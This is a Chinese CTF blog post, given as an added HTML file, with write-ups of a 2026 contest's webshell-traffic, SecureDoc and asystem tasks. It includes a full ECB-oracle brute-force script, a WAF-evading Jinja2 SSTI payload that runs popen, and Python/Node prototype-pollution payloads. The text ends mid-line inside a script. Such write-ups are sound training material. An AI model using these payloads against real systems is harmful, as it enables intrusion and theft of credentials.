@@ -1,0 +1,633 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_a0oqhord1y';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  <title>
+    2026 数字中国创新大赛网络安全子赛道团队赛 WriteUp | 雾島风起時
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_a0oqhord1y.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="2026 数字中国创新大赛网络安全子赛道团队赛 WriteUp前言第一次在星盟带队打比赛，解出了五道题排名第二  SecureDoc 是别的师傅爆破出了密码，最后由我绕过 WAF 拿到二血 asystem 其他师傅也解出来了，但是我交的快，哈哈，相当于五道题都是我解的，这波带飞了 虽然是松柏组，但是这个成绩在学生组也是能进决赛的（松柏前四） Misc冰碧蝎?过滤 HTTP  追踪第一个 POST">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2026 数字中国创新大赛网络安全子赛道团队赛 WriteUp">
+<meta property="og:url" content="http://example.com/2026/04/14/2026%20%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%90%E8%B5%9B%E9%81%93%E5%9B%A2%E9%98%9F%E8%B5%9B%20WriteUp/index.html">
+<meta property="og:site_name" content="雾島风起時">
+<meta property="og:description" content="2026 数字中国创新大赛网络安全子赛道团队赛 WriteUp前言第一次在星盟带队打比赛，解出了五道题排名第二  SecureDoc 是别的师傅爆破出了密码，最后由我绕过 WAF 拿到二血 asystem 其他师傅也解出来了，但是我交的快，哈哈，相当于五道题都是我解的，这波带飞了 虽然是松柏组，但是这个成绩在学生组也是能进决赛的（松柏前四） Misc冰碧蝎?过滤 HTTP  追踪第一个 POST">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69ddd4b6f0cf5d89b0eb8eda.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69ddd768f0cf5d89b0eb9eb5.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69ddd77ff0cf5d89b0eb9ef5.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69ddd884f0cf5d89b0ebae0f.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69dde0f9f0cf5d89b0ebcef8.png">
+<meta property="article:published_time" content="2026-04-14T05:18:00.000Z">
+<meta property="article:modified_time" content="2026-04-14T06:43:49.833Z">
+<meta property="article:author" content="ALL">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/69ddd4b6f0cf5d89b0eb8eda.png">
+    <link rel="alternate" href="/atom.xml" title="雾島风起時" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="2026 数字中国创新大赛网络安全子赛道团队赛 WriteUp">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">2026 数字中国创新大赛网络安全子赛道团队赛 WriteUp</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2026-%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%90%E8%B5%9B%E9%81%93%E5%9B%A2%E9%98%9F%E8%B5%9B-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2026 数字中国创新大赛网络安全子赛道团队赛 WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E7%A2%A7%E8%9D%8E"><span class="toc-number">1.2.1.</span> <span class="toc-text">冰碧蝎?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SecureDoc"><span class="toc-number">1.3.1.</span> <span class="toc-text">SecureDoc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#asystem"><span class="toc-number">1.3.2.</span> <span class="toc-text">asystem</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#base"><span class="toc-number">1.4.1.</span> <span class="toc-text">base</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.5.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#keep-stack"><span class="toc-number">1.5.1.</span> <span class="toc-text">keep_stack</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">51</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">11</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">98</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-2026 数字中国创新大赛网络安全子赛道团队赛 WriteUp" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-14T05:18:00.000Z" itemprop="datePublished">2026-04-14</time>
+    <time style="display: none;" id="post-update-time">2026-04-14</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="2026-数字中国创新大赛网络安全子赛道团队赛-WriteUp"><a href="#2026-数字中国创新大赛网络安全子赛道团队赛-WriteUp" class="headerlink" title="2026 数字中国创新大赛网络安全子赛道团队赛 WriteUp"></a>2026 数字中国创新大赛网络安全子赛道团队赛 WriteUp</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次在星盟带队打比赛，解出了五道题排名第二</p>
+<p><img src="https://pic1.imgdb.cn/item/69ddd4b6f0cf5d89b0eb8eda.png"></p>
+<p>SecureDoc 是别的师傅爆破出了密码，最后由我绕过 WAF 拿到二血</p>
+<p>asystem 其他师傅也解出来了，但是我交的快，哈哈，相当于五道题都是我解的，这波带飞了</p>
+<p>虽然是松柏组，但是这个成绩在学生组也是能进决赛的（松柏前四）</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="冰碧蝎"><a href="#冰碧蝎" class="headerlink" title="冰碧蝎?"></a>冰碧蝎?</h3><p>过滤 HTTP</p>
+<p><img src="https://pic1.imgdb.cn/item/69ddd768f0cf5d89b0eb9eb5.png"></p>
+<p>追踪第一个 POST 请求拿到密钥 1ca3b8c9c81a5fdc</p>
+<p><img src="https://pic1.imgdb.cn/item/69ddd77ff0cf5d89b0eb9ef5.png"></p>
+<p>后续一直在访问 &#x2F;upload&#x2F;1774…….dcic.php 路径，确认这个就是 WebShell</p>
+<p><img src="https://pic1.imgdb.cn/item/69ddd884f0cf5d89b0ebae0f.png"></p>
+<p>解密方式是 base64 -&gt; AES-128-CBC -&gt; IV &#x3D; 16字节全0</p>
+<p>解密流量其中有一条关键命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/ww/html/upload/;<span class="built_in">echo</span> 2i9Q8AtFEuzYHxwcUmpjFCQchUd1QqwQMf8mWfvUwm9LE8UaKVYDTaq5tG</span><br></pre></td></tr></table></figure>
+
+<p>将 <code>2i9Q8AtFEuzYHxwcUmpjFCQchUd1QqwQMf8mWfvUwm9LE8UaKVYDTaq5tG</code> 解码 Base58 拿到 flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dbeeed36-0d7e-211a-69db-66bd74ea91d5&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="SecureDoc"><a href="#SecureDoc" class="headerlink" title="SecureDoc"></a>SecureDoc</h3><p>在 <code>/documents/apply-template</code> 接口中，系统提供了一个“数字水印加密预览”功能，通过测试发现该加密方式为 AES-ECB 模式</p>
+<p>由于用户输入的内容会被直接与一段未知的 Secret（包含管理员密码）拼接后进行加密，我们可以通过控制输入长度和内容，利用 ECB Oracle 攻击逐字节爆破出后端的 Secret 内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line">url = <span class="string">&#x27;http://web-7d1d6e9377.adworld.xctf.org.cn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    u = <span class="string">&quot;user&quot;</span> + <span class="built_in">str</span>(random.randint(<span class="number">1000</span>, <span class="number">99999</span>))</span><br><span class="line">    p = <span class="string">&quot;password123&quot;</span></span><br><span class="line">    session.post(url + <span class="string">&#x27;/register&#x27;</span>, json=&#123;<span class="string">&#x27;username&#x27;</span>: u, <span class="string">&#x27;password&#x27;</span>: p&#125;)</span><br><span class="line">    session.post(url + <span class="string">&#x27;/login&#x27;</span>, json=&#123;<span class="string">&#x27;username&#x27;</span>: u, <span class="string">&#x27;password&#x27;</span>: p&#125;)</span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">session, payload</span>):</span><br><span class="line">    res = session.post(url + <span class="string">&#x27;/documents/apply-template&#x27;</span>, json=&#123;<span class="string">&#x27;content&#x27;</span>: payload&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(res.json()[<span class="string">&#x27;preview&#x27;</span>][<span class="string">&#x27;encrypted_content&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    session = login()</span><br><span class="line">    block_size = <span class="number">16</span></span><br><span class="line">    known_secret = <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        pad_len = block_size - <span class="number">1</span> - (i % block_size)</span><br><span class="line">        pad = <span class="string">&quot;A&quot;</span> * pad_len</span><br><span class="line">        target_block_idx = i // block_size</span><br><span class="line">        </span><br><span class="line">        target_ct = encrypt(session, pad)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> target_ct:</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            target_ct = encrypt(session, pad)</span><br><span class="line">                </span><br><span class="line">        target_block = target_ct[target_block_idx * block_size : (target_block_idx + <span class="number">1</span>) * block_size]</span><br><span class="line">        </span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">            payload = pad + known_secret + c</span><br><span class="line">            ct = encrypt(session, payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> ct:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ct[target_block_idx * block_size : (target_block_idx + <span class="number">1</span>) * block_size] == target_block:</span><br><span class="line">                known_secret += c</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found byte: <span class="subst">&#123;<span class="built_in">repr</span>(c)&#125;</span>, Secret so far: <span class="subst">&#123;<span class="built_in">repr</span>(known_secret)&#125;</span>&quot;</span>)</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
+
+<p>通过爆破，得到管理员的账号和密码：</p>
+<ul>
+<li>username: suP3r@dm!n</li>
+<li>password: S3cur3P@ssZmQxYTdh!</li>
+</ul>
+<p>使用获取到的管理员凭证登录后，进入 <code>/admin/dashboard</code> 管理面板</p>
+<p>该面板提供了一个报告模板预览功能 <code>/admin/report/preview</code>，存在 SSTI 漏洞</p>
+<p>该接口配置了严格的 WAF，过滤了大量关键字（如 class, request, os, popen 等）和特殊符号（如 [], +, ~）</p>
+<p>为了绕过这些限制：</p>
+<ol>
+<li>绕过关键字：利用字符串拼接，如 <code>&#39;c&#39;</code> <code>&#39;lass&#39;</code> 和 <code>&#39;po&#39;</code> <code>&#39;pen&#39;</code></li>
+<li>绕过方括号：使用 <code>|attr(&#39;getitem&#39;)</code> 过滤器替代 <code>[]</code> 取值</li>
+<li>绕过函数调用检测：在 <code>attr</code> 和括号之间添加空格，如 <code>attr (&#39;...&#39;)</code></li>
+</ol>
+<p>最终构造出以下 Payload，通过 <code>os._wrap_close</code> 类（在 <code>subclasses()</code> 中索引为 141）来调用 <code>popen</code> 执行系统命令 <code>cat /flag</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ()|attr (<span class="string">&#x27;__c&#x27;</span> <span class="string">&#x27;lass__&#x27;</span>)|attr (<span class="string">&#x27;__b&#x27;</span> <span class="string">&#x27;ase__&#x27;</span>)|attr (<span class="string">&#x27;__subcl&#x27;</span> <span class="string">&#x27;asses__&#x27;</span>) ()|attr (<span class="string">&#x27;__ge&#x27;</span> <span class="string">&#x27;titem__&#x27;</span>) (<span class="number">141</span>)|attr (<span class="string">&#x27;__in&#x27;</span> <span class="string">&#x27;it__&#x27;</span>)|attr (<span class="string">&#x27;__gl&#x27;</span> <span class="string">&#x27;obals__&#x27;</span>)|attr (<span class="string">&#x27;__ge&#x27;</span> <span class="string">&#x27;titem__&#x27;</span>) (<span class="string">&#x27;po&#x27;</span> <span class="string">&#x27;pen&#x27;</span>) (<span class="string">&#x27;c&#x27;</span> <span class="string">&#x27;at /f&#x27;</span> <span class="string">&#x27;lag&#x27;</span>)|attr (<span class="string">&#x27;re&#x27;</span> <span class="string">&#x27;ad&#x27;</span>) () &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="asystem"><a href="#asystem" class="headerlink" title="asystem"></a>asystem</h3><p>在上传系统提供的下载接口 <code>/download?filename=</code> 中，存在任意文件读取漏洞</p>
+<p>通过目录遍历（如 <code>../../../../../../../../../../app/app.py</code> 和 <code>../server/app.js</code>）成功获取了 Python 前端和 Node.js 后端的源码</p>
+<p>在 Flask 的 <code>/register</code> 路由中，程序使用自定义的 <code>merge()</code> 函数将 JSON 数据合并到 User 对象中，并且在合并前检查全局 WAF 黑名单列表</p>
+<p>我们可以通过构造含有 <code>class.init.globals.WAF</code> 键的恶意 JSON，将全局 WAF 列表替换为空字符串，从而让其后续过滤机制失效</p>
+<p>因为关键字本身在 JSON 中也被过滤了，我们可以利用 Unicode 转义（如 <code>\u005f</code> 替代 <code>_</code>，<code>\u0067\u006c...</code> 替代 <code>globals</code>）绕过最开始的过滤层</p>
+<p>Node.js 后端对于 <code>.kmz</code> 文件会使用 <code>parse2-kmz</code> 进行解压和 XML 解析，该组件使用的 <code>xml2json</code> 存在原型链污染漏洞</p>
+<p>通过构造恶意的 <code>doc.kml</code>（打包成 <code>test.kmz</code>），利用 <code>&lt;proto&gt;&lt;FIX_SECRET&gt;hacked123&lt;/FIX_SECRET&gt;&lt;/proto&gt;</code>，成功污染全局变量 FIX_SECRET</p>
+<p>随后调用 <code>/api/fix-secret</code> 将管理员密钥固定为 <code>hacked123</code></p>
+<p>获得了管理员密钥后，可访问 <code>/protected</code> 路由</p>
+<p>由于该路由使用 <code>render_template_string</code> 渲染我们传入的 user 参数，并且前端过滤已被步骤 2 破坏，此处存在 SSTI 漏洞</p>
+<p>由于应用重写并禁用了 <code>os.popen</code> 等模块，且返回内容被强制截断 [-40:]，我们通过 <code>&#123;% set ... %&#125;</code> 使用内置函数 <code>open()</code> 将 <code>/flag</code> 读取并写入静态目录 <code>/datas/upload_files/img/f.txt</code> 中，最后再通过下载接口读取文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">url_base = <span class="string">&quot;http://web-3d7fcabff2.adworld.xctf.org.cn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 绕过 WAF (Python 原型链污染)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Polluting Python WAF...&quot;</span>)</span><br><span class="line">data_str = <span class="string">&quot;&#123;&quot;</span> + <span class="string">&#x27;&quot;\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f&quot;: &#123; &quot;\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f&quot;: &#123; &quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot;: &#123; &quot;\\u0057\\u0041\\u0046&quot;: &quot;&quot; &#125; &#125; &#125; &#125;&#x27;</span></span><br><span class="line">requests.post(<span class="string">f&quot;<span class="subst">&#123;url_base&#125;</span>/register&quot;</span>, data=data_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 污染 Node.js 的 Admin Secret (Node.js 原型链污染)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Polluting Node.js FIX_SECRET via KMZ XML parser...&quot;</span>)</span><br><span class="line">xml_payload = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;kml xmlns=&quot;http://www.opengis.net/kml/2.2&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;__proto__&gt;</span></span><br><span class="line"><span class="string">    &lt;FIX_SECRET&gt;hacked123&lt;/FIX_SECRET&gt;</span></span><br><span class="line"><span class="string">  &lt;/__proto__&gt;</span></span><br><span class="line"><span class="string">&lt;/kml&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">zip_buffer = io.BytesIO()</span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(zip_buffer, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED, <span class="literal">False</span>) <span class="keyword">as</span> zip_file:</span><br><span class="line">    zip_file.writestr(<span class="string">&quot;doc.kml&quot;</span>, xml_payload)</span><br><span class="line"></span><br><span class="line">requests.post(<span class="string">f&quot;<span class="subst">&#123;url_base&#125;</span>/api/upload&quot;</span>, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.kmz&#x27;</span>, zip_buffer.getvalue(), <span class="string">&#x27;application/vnd.google-earth.kmz&#x27;</span>)&#125;)</span><br><span class="line">requests.get(<span class="string">f&quot;<span 